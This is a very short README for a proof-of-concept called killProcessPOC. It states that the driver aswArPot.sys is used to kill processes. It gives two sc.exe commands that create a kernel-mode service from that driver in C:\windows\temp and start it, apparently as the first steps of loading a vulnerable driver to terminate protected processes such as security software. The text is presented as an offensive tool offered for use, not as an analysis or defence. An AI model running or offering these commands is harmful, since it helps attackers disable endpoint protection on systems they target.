# killProcessPOC
use aswArPot.sys to kill process

```
sc.exe create aswSP_ArPots binPath=C:\windows\temp\aswarpot.sys type=kernel

sc.exe start aswSP_ArPots

```
